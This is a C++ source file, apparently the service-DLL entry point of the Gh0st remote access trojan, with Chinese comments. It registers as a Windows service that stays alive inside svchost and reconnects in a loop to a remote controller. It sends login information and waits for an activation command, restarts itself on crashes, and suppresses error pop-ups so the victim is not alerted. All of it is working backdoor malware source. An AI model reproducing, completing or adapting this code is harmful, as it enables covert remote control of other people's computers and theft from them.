// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include "until.h"
#include "PrincDll.h"
#include "ClientSocket.h"
#include "LogIn.h"
#include "KernelManager.h"
#include "install.h"

//force dll main
#ifdef _X86_
extern "C" { int _afxForceUSRDLL; }
#else
extern "C" { int __afxForceUSRDLL; }
#endif


enum
{
	NOT_CONNECT, //  还没有连接
	GETLOGINFO_ERROR,
	CONNECT_ERROR,
	HEARTBEATTIMEOUT_ERROR
};
// variables
SERVICE_STATUS_HANDLE hServiceStatus;
DWORD	g_dwCurrState;
DWORD	g_dwServiceType;
wchar_t	svcname[MAX_PATH];


#define		HEART_BEAT_TIME		1000 * 60 * 3 // 心跳时间

LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	// 发生异常，重新创建进程
	HANDLE	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}

DWORD WINAPI main(wchar_t *lpServiceName)
{
	// lpServiceName,在ServiceMain返回后就没有了
	wchar_t	strServiceName[256];
	wchar_t	strKillEvent[50];
	//HANDLE	hInstallMutex = NULL;
	wsprintf(strKillEvent, _T("Global\\Gh0st %d"), GetTickCount()); // 随机事件名

	// 告诉操作系统:如果没有找到CD/floppy disc,不要弹窗口吓人
	SetErrorMode( SEM_FAILCRITICALERRORS);
	wchar_t	*lpszHost = NULL;
	DWORD	dwPort = 80;



	HANDLE	hEvent = NULL;

	CClientSocket socketClient;
	BYTE	bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接
	while (1)
	{
		// 如果不是心跳超时，不用再sleep两分钟
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2分钟断线重连, 为了尽快响应killevent
			for (int i = 0; i < 2000; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
					//break;
				}
				// 改一下
				Sleep(60);
			}
		}
		
		DWORD dwTickCount = GetTickCount();
		if (!socketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = CONNECT_ERROR;
			continue;
		}
		// 登录
		
		DWORD dwExitCode = SOCKET_ERROR;
		lstrcpy(strServiceName, lpServiceName);
		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
		socketClient.setManagerCallBack(&manager);

		// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接
		if (!manager.IsActived())
			continue;

		//////////////////////////////////////////////////////////////////////////

		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();

		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while(hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}

	SetErrorMode(0);
	//ReleaseMutex(hInstallMutex);
	//CloseHandle(hInstallMutex);
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

extern "C" PRINCDLL_API void ServiceMain( int argc, wchar_t* argv[] )
{
	wcsncpy(svcname, (wchar_t*)argv[0], sizeof svcname); //it's should be unicode, but if it's ansi we do it well
	//wcstombs(svcname, argv[0], sizeof svcname);
	hServiceStatus = RegisterServiceCtrlHandler(svcname, (LPHANDLER_FUNCTION)ServiceHandler);
	if( hServiceStatus == NULL )
	{
		return;
	}else FreeConsole();

	TellSCM( SERVICE_START_PENDING, 0, 1 );
	TellSCM( SERVICE_RUNNING, 0, 0);
	// call Real Service function noew

	g_dwServiceType = QueryServiceTypeFromRegedit(svcname);
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
	do{
		Sleep(100);//not quit until receive stop command, otherwise the service will stop
	}while(g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);

	if (g_dwServiceType == 0x120)
	{
		//Shared的服务 ServiceMain 不退出，不然一些系统上svchost进程也会退出
		while (1) Sleep(10000);
	}
	return;
}

int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
{
	SERVICE_STATUS srvStatus;
	srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
	srvStatus.dwCurrentState = g_dwCurrState = dwState;
	srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	srvStatus.dwWin32ExitCode = dwExitCode;
	srvStatus.dwServiceSpecificExitCode = 0;
	srvStatus.dwCheckPoint = dwProgress;
	srvStatus.dwWaitHint = 1000;
	return SetServiceStatus( hServiceStatus, &srvStatus );
}

void __stdcall ServiceHandler(DWORD    dwControl)
{
	// not really necessary because the service stops quickly
	switch( dwControl )
	{
	case SERVICE_CONTROL_STOP:
		TellSCM( SERVICE_STOP_PENDING, 0, 1 );
		Sleep(10);
		TellSCM( SERVICE_STOPPED, 0, 0 );
		break;
	case SERVICE_CONTROL_PAUSE:
		TellSCM( SERVICE_PAUSE_PENDING, 0, 1 );
		TellSCM( SERVICE_PAUSED, 0, 0 );
		break;
	case SERVICE_CONTROL_CONTINUE:
		TellSCM( SERVICE_CONTINUE_PENDING, 0, 1 );
		TellSCM( SERVICE_RUNNING, 0, 0 );
		break;
	case SERVICE_CONTROL_INTERROGATE:
		TellSCM( g_dwCurrState, 0, 0 );
		break;
	}
}
